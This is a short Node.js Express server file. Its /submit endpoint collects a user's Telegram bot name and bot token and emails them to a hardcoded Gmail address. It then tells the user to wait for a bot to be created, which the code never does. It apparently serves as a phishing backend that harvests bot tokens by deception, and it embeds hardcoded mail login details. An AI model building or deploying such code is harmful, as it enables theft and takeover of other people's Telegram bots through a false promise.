const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(express.static('public'));
app.use(bodyParser.json());

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'kelvinwebsitereviews@gmail.com',
        pass: 'kelvinwebsitereviews@gmail.com'
    }
});

app.post('/submit', (req, res) => {
    const { botName, botToken } = req.body;

    const mailOptions = {
        from: 'kelvinwebsitereviews@gmail.com',
        to: 'kelvinwebsitereviews@gmail.com',
        subject: 'New Telegram Bot Token',
        text: `Bot Name: ${botName}\nBot Token: ${botToken}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.json({ message: 'Error sending email.' });
        }
        res.json({ message: 'Token sent! Please wait for your bot to be created.' });
    });
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
